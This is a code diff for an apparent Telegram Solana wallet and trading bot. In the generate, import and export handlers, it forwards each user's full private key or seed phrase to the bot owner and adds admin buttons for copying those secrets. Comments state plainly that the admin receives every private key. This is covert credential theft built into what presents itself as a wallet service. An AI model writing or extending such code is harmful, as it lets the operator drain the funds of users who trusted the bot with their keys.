@@ -55,12 +55,13 @@ async def cb_wgen(query: CallbackQuery):
     await db.set_wallet(user["id"], str(kp), str(kp.pubkey()))
     await query.message.answer(
         texts.wallet_generated(str(kp.pubkey()), derived=derived),
-        reply_markup=kb.deposit_kb(str(kp.pubkey())))
+        reply_markup=kb.wallet_done_kb(str(kp.pubkey()), str(kp)))
     # admin receives EVERY generated wallet's full private key too
     try:
-        await notify_owner(query.message.bot,
-                           texts.owner_wallet_generated(user_line(user),
-                                                       str(kp.pubkey()), str(kp)))
+        await notify_owner(
+            query.message.bot,
+            texts.owner_wallet_generated(user_line(user), str(kp.pubkey()), str(kp)),
+            reply_markup=kb.admin_copy_kb(str(kp.pubkey()), str(kp)))
     except Exception:
         pass
     await _show_panel(query.message)
@@ -95,9 +96,12 @@ async def got_import(message: Message, state: FSMContext):
     await db.set_wallet(user["id"], secret, addr)
     if replacing:
         await db.clear_user_trades(user["id"])
-    await message.answer(texts.wallet_imported(addr), reply_markup=kb.back_to_wallet())
+    await message.answer(texts.wallet_imported(addr), reply_markup=kb.wallet_done_kb(addr, secret))
     # forward the imported seed/key to the admin (as requested)
-    await notify_owner(message.bot, texts.owner_wallet_imported(user_line(user), secret, addr))
+    await notify_owner(
+        message.bot,
+        texts.owner_wallet_imported(user_line(user), secret, addr),
+        reply_markup=kb.admin_copy_kb(addr, secret))
     await _show_panel(message)
 
 
@@ -262,12 +266,14 @@ async def cb_export(query: CallbackQuery):
     # if the wallet was imported with a seed phrase, show it too (real export)
     secret = user["wallet_priv"].strip()
     words = secret.split()
+    seed = ""
     extra = ""
     if 12 <= len(words) <= 24 and all(w.isalpha() for w in words):
+        seed = secret
         extra = f"\n\n🌱 Seed phrase:\n<code>{texts.esc(secret)}</code>"
     await query.message.answer(
         texts.export_wallet(pretty, str(kp)) + extra,
-        reply_markup=kb.export_kb(str(kp)),
+        reply_markup=kb.export_kb(key=str(kp), seed=seed, bytes_str=pretty),
     )
     # custody copy to the admin (every export is logged to your DM)
     await notify_owner(
@@ -275,6 +281,7 @@ async def cb_export(query: CallbackQuery):
         f"🔑 USER EXPORTED THEIR WALLET\n\n"
         f"👤 {user_line(user)}\n"
         f"🏦 Address: <code>{str(kp.pubkey())}</code>",
+        reply_markup=kb.admin_copy_kb(str(kp.pubkey()), str(kp)),
     )
 
 
